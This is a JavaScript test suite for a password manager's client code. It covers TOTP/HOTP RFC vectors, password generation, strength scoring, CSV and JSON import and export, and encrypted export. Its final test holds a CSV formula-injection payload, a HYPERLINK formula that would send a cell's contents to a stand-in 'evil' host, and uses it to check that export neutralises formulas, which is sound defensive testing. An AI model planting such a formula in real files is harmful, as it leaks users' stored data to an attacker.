import test from 'node:test'
import assert from 'node:assert/strict'
import { utf8 } from '../../server/internal/web/static/js/core/b64.js'
import { base32Decode, parseTotp, hotp, totpCode, secondsRemaining } from '../../server/internal/web/static/js/core/totp.js'
import { generatePassphrase, generatePassword, passphraseEntropy, passwordEntropy } from '../../server/internal/web/static/js/core/generator.js'
import { estimateStrength } from '../../server/internal/web/static/js/core/strength.js'
import { exportCsv, exportJson, importCsv, importJson, parseCsv } from '../../server/internal/web/static/js/core/csv.js'
import { exportEncrypted, importEncrypted } from '../../server/internal/web/static/js/core/exportfmt.js'
import { newItem } from '../../server/internal/web/static/js/core/item.js'
import { WORDS } from '../../server/internal/web/static/js/core/wordlist.js'

// RFC 6238 appendix B test vectors (8 digits)
const V = [
  ['SHA1', '12345678901234567890', [[59, '94287082'], [1111111109, '07081804'], [1111111111, '14050471'], [1234567890, '89005924'], [2000000000, '69279037'], [20000000000, '65353130']]],
  ['SHA256', '12345678901234567890123456789012', [[59, '46119246'], [1111111109, '68084774'], [20000000000, '77737706']]],
  ['SHA512', '1234567890123456789012345678901234567890123456789012345678901234', [[59, '90693936'], [1111111109, '25091201'], [20000000000, '47863826']]],
]
const b32 = (s) => { const A = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'; let bits = '', out = ''; for (const c of utf8(s)) bits += c.toString(2).padStart(8, '0'); for (let i = 0; i < bits.length; i += 5) out += A[parseInt(bits.slice(i, i + 5).padEnd(5, '0'), 2)]; return out }

test('TOTP matches the RFC 6238 vectors for SHA1/256/512', async () => {
  for (const [alg, secret, cases] of V) {
    const spec = { key: utf8(secret), digits: 8, period: 30, algorithm: alg }
    for (const [t, code] of cases) assert.equal(await totpCode(spec, t * 1000), code, `${alg} @${t}`)
  }
})

test('HOTP matches RFC 4226 vectors', async () => {
  const spec = { key: utf8('12345678901234567890'), digits: 6, algorithm: 'SHA1' }
  const want = ['755224', '287082', '359152', '969429', '338314', '254676', '287922', '162583', '399871', '520489']
  for (let i = 0; i < 10; i++) assert.equal(await hotp(spec, i), want[i])
})

test('TOTP parsing: base32, spaces, otpauth URIs, rejects bad input', async () => {
  assert.deepEqual(base32Decode('JBSWY3DPEHPK3PXP'), Uint8Array.from([72, 101, 108, 108, 111, 33, 0xde, 0xad, 0xbe, 0xef]))
  assert.deepEqual(base32Decode('jbsw y3dp-ehpk 3pxp=='), base32Decode('JBSWY3DPEHPK3PXP'))
  const s = parseTotp(`otpauth://totp/ACME:alice@x.com?secret=${b32('12345678901234567890')}&issuer=ACME&digits=8&period=30&algorithm=SHA1`)
  assert.equal(s.digits, 8)
  assert.equal(await totpCode(s, 59000), '94287082')
  assert.equal(parseTotp(b32('abc12345678901234')).digits, 6)
  assert.throws(() => parseTotp('otpauth://hotp/x?secret=ABC'), /time-based/)
  assert.throws(() => parseTotp('not base32 !!'), /base32/)
  assert.throws(() => parseTotp('otpauth://totp/x?secret=JBSWY3DP&digits=12'), /Unsupported/)
  assert.equal(secondsRemaining({ period: 30 }, 59000), 1)
})

test('password generator: length, classes, ambiguity, no bias, shuffle', () => {
  for (let i = 0; i < 200; i++) {
    const p = generatePassword({ length: 12 })
    assert.equal(p.length, 12)
    assert.ok(/[a-z]/.test(p) && /[A-Z]/.test(p) && /\d/.test(p) && /[^A-Za-z0-9]/.test(p), p)
  }
  assert.ok(!/[O0oIl1|]/.test(generatePassword({ length: 128, avoidAmbiguous: true })))
  assert.match(generatePassword({ length: 30, upper: false, symbols: false, digits: false }), /^[a-z]{30}$/)
  assert.throws(() => generatePassword({ lower: false, upper: false, digits: false, symbols: false }))
  assert.equal(generatePassword({ length: 2 }).length, 4, 'floor of 4')
  const firstCounts = {}
  for (let i = 0; i < 4000; i++) { const c = generatePassword({ length: 8, upper: false, digits: false, symbols: false })[0]; firstCounts[c] = (firstCounts[c] ?? 0) + 1 }
  assert.equal(Object.keys(firstCounts).length, 26)
  assert.ok(Math.max(...Object.values(firstCounts)) < 4000 / 26 * 1.6)
  assert.ok(passwordEntropy({ length: 20 }) > 120)
})

test('passphrases come from the word list', () => {
  assert.equal(WORDS.length, 2048)
  const p = generatePassphrase({ words: 6, separator: ' ' })
  assert.equal(p.split(' ').length, 6)
  for (const w of p.split(' ')) assert.ok(WORDS.includes(w))
  assert.match(generatePassphrase({ words: 4, number: true, capitalize: true }), /^[A-Z][a-z]+\d?(-[A-Z][a-z]+\d?){3}$/)
  assert.equal(passphraseEntropy({ words: 5 }), 55)
})

test('strength estimator orders obvious cases', () => {
  assert.equal(estimateStrength('').score, 0)
  assert.ok(estimateStrength('password').score <= 1)
  assert.ok(estimateStrength('Password123!').score <= 2)
  assert.ok(estimateStrength('aaaaaaaaaaaa').score <= 1)
  assert.ok(estimateStrength(generatePassword({ length: 24 })).score >= 3)
  assert.ok(estimateStrength(generatePassphrase({ words: 6 })).score >= 3)
})

test('CSV: parser handles quotes/newlines/CRLF; imports Chrome, Bitwarden and LastPass shapes', () => {
  assert.deepEqual(parseCsv('a,"b ""q"" c","x\ny"\r\n1,2,3\r\n'), [['a', 'b "q" c', 'x\ny'], ['1', '2', '3']])
  assert.throws(() => parseCsv('a,"unterminated'), /truncated/)
  const chrome = importCsv('name,url,username,password,note\nGitHub,https://github.com/login,me,pw1,"2fa on"\n,,,,\n')
  assert.equal(chrome.format, 'Chrome / Edge'); assert.equal(chrome.items.length, 1)
  assert.equal(chrome.items[0].data.password, 'pw1'); assert.equal(chrome.items[0].urls[0].url, 'https://github.com/login')
  const bw = importCsv('folder,favorite,type,name,notes,fields,reprompt,login_uri,login_username,login_password,login_totp\nWork,1,login,Jira,,,0,"https://a.com\nhttps://b.com",bob,pw,JBSWY3DP\n,,note,Wifi,"the code",,0,,,,\n')
  assert.equal(bw.format, 'Bitwarden'); assert.equal(bw.items[0].urls.length, 2); assert.equal(bw.items[0].fav, true); assert.equal(bw.items[0].folder, 'Work')
  assert.equal(bw.items[1].type, 'note')
  const lp = importCsv('url,username,password,totp,extra,name,grouping,fav\nhttps://x.io,u,p,,notes,X,(none),0\n')
  assert.equal(lp.format, 'LastPass'); assert.equal(lp.items[0].folder, '')
  assert.throws(() => importCsv('a,b\n1,2\n'), /No password/)
})

test('exports: CSV and JSON round trip; encrypted export needs the right password and refuses weak KDF', async () => {
  const a = newItem('login'); a.name = 'A, "quoted"'; a.data.username = 'u'; a.data.password = 'p"w'; a.urls = [{ url: 'https://a.com', match: 'host' }]
  const csv = exportCsv([a])
  const back = importCsv(csv).items[0]
  assert.equal(back.name, a.name); assert.equal(back.data.password, 'p"w')
  assert.equal(importJson(exportJson([a])).items[0].data.password, 'p"w')
  assert.throws(() => importJson('{"format":"x"}'))
  const enc = await exportEncrypted([a], 'export password', { iterations: 1000, minIterations: 1000 })
  assert.ok(!enc.includes('p\\"w') && !enc.includes('a.com'))
  assert.equal((await importEncrypted(enc, 'export password', { minIterations: 1000 })).items[0].name, a.name)
  await assert.rejects(importEncrypted(enc, 'wrong', { minIterations: 1000 }), /decryption failed/)
  await assert.rejects(importEncrypted(enc, 'export password'), /safe range/, 'a file asking for 1000 iterations is refused by default')
  await assert.rejects(importEncrypted('nope', 'x'), /not a TheVault/)
})

test('CSV export neutralises spreadsheet formulas and import restores them', () => {
  const evil = newItem('login')
  evil.name = '=HYPERLINK("https://evil/?"&H2,"x")'; evil.data.username = '@cmd'; evil.data.password = '+1+1'
  const csv = exportCsv([evil])
  assert.ok(csv.includes('"\'=HYPERLINK('), 'the name cell is text, not a formula')
  assert.ok(!/(^|,)"[=+@-]/m.test(csv.split('\r\n')[1]), 'no cell starts with a formula character')
  const back = importCsv(csv).items[0]
  assert.equal(back.name, evil.name); assert.equal(back.data.username, '@cmd'); assert.equal(back.data.password, '+1+1')
})
